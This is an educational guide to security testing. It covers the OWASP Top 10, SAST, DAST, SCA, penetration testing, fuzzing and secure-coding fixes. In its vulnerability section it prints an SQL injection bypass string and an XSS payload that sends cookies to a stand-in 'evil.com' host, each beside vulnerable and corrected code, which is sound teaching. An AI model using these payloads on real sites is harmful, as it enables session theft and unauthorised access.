# Security Testing

## What is Security Testing?

**Security testing** is the process of identifying vulnerabilities, threats, and risks in a software application to prevent malicious attacks and ensure that confidential data remains protected. Unlike other testing types that focus on functionality, security testing actively attempts to exploit weaknesses.

Security testing is not a single activity — it is a set of complementary practices applied throughout the Software Development Life Cycle (SDLC).

---

## Why Security Testing Matters

- **Data breaches** expose personally identifiable information (PII), financial records, and intellectual property.
- **Regulations** such as GDPR, HIPAA, and PCI-DSS mandate security controls and testing.
- **The cost of a breach** far exceeds the cost of prevention: IBM's 2023 Cost of a Data Breach Report estimates the average breach costs $4.45 million USD.
- **Attackers are automated**: bots continuously scan the internet for known vulnerabilities.

---

## OWASP Top 10

The [Open Worldwide Application Security Project (OWASP)](https://owasp.org) publishes the **OWASP Top 10**, a consensus list of the most critical web application security risks.

### OWASP Top 10 (2021)

| # | Risk | Description |
|---|------|-------------|
| A01 | Broken Access Control | Users can act outside their intended permissions |
| A02 | Cryptographic Failures | Weak or missing encryption exposes sensitive data |
| A03 | Injection | Untrusted data is sent to an interpreter (SQL, OS, LDAP) |
| A04 | Insecure Design | Architectural flaws that no implementation can fix |
| A05 | Security Misconfiguration | Default settings, open cloud storage, verbose errors |
| A06 | Vulnerable and Outdated Components | Using libraries with known CVEs |
| A07 | Identification and Authentication Failures | Weak passwords, broken session management |
| A08 | Software and Data Integrity Failures | Insecure CI/CD pipelines, unsigned updates |
| A09 | Security Logging and Monitoring Failures | Attacks go undetected due to poor logging |
| A10 | Server-Side Request Forgery (SSRF) | Server makes requests to unintended internal resources |

---

## Types of Security Tests

### 1. Static Application Security Testing (SAST)

Analyses source code, bytecode, or binaries **without executing** the application.

- **When:** During development, in CI/CD pipelines.
- **Detects:** Hardcoded credentials, SQL injection patterns, insecure deserialization, use of banned functions.
- **Limitation:** High false-positive rate; cannot detect runtime issues.

**Tools:** SonarQube, Checkmarx, Semgrep, SpotBugs + FindSecBugs, Bandit (Python), Brakeman (Ruby on Rails).

---

### 2. Dynamic Application Security Testing (DAST)

Tests the **running application** by sending HTTP requests and analysing responses.

- **When:** In CI/CD against a deployed environment, or during QA.
- **Detects:** XSS, SQL injection, CSRF, exposed debug endpoints.
- **Limitation:** Cannot see inside the application; may miss logic flaws.

**Tools:** OWASP ZAP, Burp Suite, Nikto, Acunetix.

---

### 3. Interactive Application Security Testing (IAST)

Uses instrumentation agents inside the running application to monitor execution during testing.

- **When:** During functional testing or in a staging environment.
- **Detects:** Combines the depth of SAST with the accuracy of DAST.
- **Tools:** Contrast Security, Seeker, HCL AppScan.

---

### 4. Software Composition Analysis (SCA)

Identifies known vulnerabilities in **third-party dependencies**.

- **When:** Continuously, as part of the build pipeline.
- **Detects:** Libraries with published CVEs (Common Vulnerabilities and Exposures).

**Tools:** OWASP Dependency-Check, Snyk, GitHub Dependabot, Mend (formerly WhiteSource).

**Example (Maven):**
```bash
mvn org.owasp:dependency-check-maven:check
```

---

### 5. Penetration Testing

Human security experts (or authorised automated tools) attempt to **exploit** vulnerabilities as a real attacker would.

**Phases:**
1. **Reconnaissance:** Gather information about the target.
2. **Scanning:** Identify open ports, services, and vulnerabilities.
3. **Exploitation:** Attempt to exploit discovered vulnerabilities.
4. **Post-exploitation:** Assess the impact of a successful breach.
5. **Reporting:** Document findings and remediation recommendations.

**Types:**
- **Black-box:** Tester has no knowledge of the system.
- **White-box:** Tester has full access to source code and architecture.
- **Grey-box:** Tester has partial knowledge (e.g., API documentation).

---

### 6. Fuzz Testing (Fuzzing)

Sends **random, malformed, or unexpected input** to the application to trigger crashes, hangs, or unexpected behaviour.

**Tools:** AFL++, libFuzzer, OSS-Fuzz, Jazzer (Java).

---

## Common Vulnerabilities and Countermeasures

### SQL Injection

**Vulnerable code (Java):**
```java
// NEVER do this
String query = "SELECT * FROM users WHERE username = '" + username + "'";
```

An attacker can input `' OR '1'='1` to bypass authentication.

**Secure code:**
```java
PreparedStatement stmt = conn.prepareStatement(
    "SELECT * FROM users WHERE username = ?"
);
stmt.setString(1, username);
```

---

### Cross-Site Scripting (XSS)

**Vulnerable code (JavaScript):**
```javascript
// Directly inserting user input into the DOM
document.getElementById('output').innerHTML = userInput;
```

An attacker can inject `<script>document.location='https://evil.com?c='+document.cookie</script>`.

**Secure code:**
```javascript
// Use textContent to prevent HTML injection
document.getElementById('output').textContent = userInput;
```

---

### Cross-Site Request Forgery (CSRF)

CSRF tricks a logged-in user's browser into making an unwanted request. Mitigation:

- Use **CSRF tokens** (synchronizer token pattern).
- Use the `SameSite` cookie attribute.
- Validate the `Origin` / `Referer` header for sensitive state-changing operations.

---

### Broken Access Control

Always enforce authorisation server-side:

```java
// Check that the authenticated user owns the resource
if (!order.getOwnerId().equals(currentUser.getId())) {
    throw new AccessDeniedException("You do not own this order");
}
```

Never rely solely on hiding UI elements to restrict access.

---

## Security Testing in the SDLC (Shift-Left Security)

Integrating security earlier in the SDLC reduces the cost of finding and fixing vulnerabilities:

| Phase | Activity |
|-------|----------|
| **Requirements** | Threat modelling, security requirements definition |
| **Design** | Architecture review, STRIDE threat modelling |
| **Development** | Secure coding guidelines, SAST in IDE, peer code reviews |
| **Build / CI** | SAST scan, SCA scan, secrets detection |
| **Staging** | DAST scan, IAST, penetration testing |
| **Production** | Runtime protection (WAF, RASP), monitoring, vulnerability disclosure |

---

## Secrets Detection

Accidentally committing credentials, API keys, or private certificates to source control is a common and serious vulnerability. Tools that scan for secrets:

- **git-secrets** – prevent commits containing secrets.
- **TruffleHog** – scan repository history for secrets.
- **GitLeaks** – fast, configurable secrets scanner.
- **GitHub Secret Scanning** – built-in scanning for popular secret patterns.

---

## Security Headers Checklist

Every HTTP response should include appropriate security headers:

| Header | Purpose |
|--------|---------|
| `Content-Security-Policy` | Prevents XSS and data injection attacks |
| `Strict-Transport-Security` | Enforces HTTPS connections |
| `X-Content-Type-Options: nosniff` | Prevents MIME-type sniffing |
| `X-Frame-Options: DENY` | Prevents clickjacking |
| `Referrer-Policy` | Controls information sent in `Referer` header |
| `Permissions-Policy` | Controls browser feature access (camera, microphone, etc.) |

---

## Further Reading

- [Best Practices →](09-best-practices.md)
- [Testing Tools →](10-testing-tools.md)
- OWASP Top 10: https://owasp.org/www-project-top-ten/
- OWASP Testing Guide: https://owasp.org/www-project-web-security-testing-guide/
- NIST Cybersecurity Framework: https://www.nist.gov/cyberframework
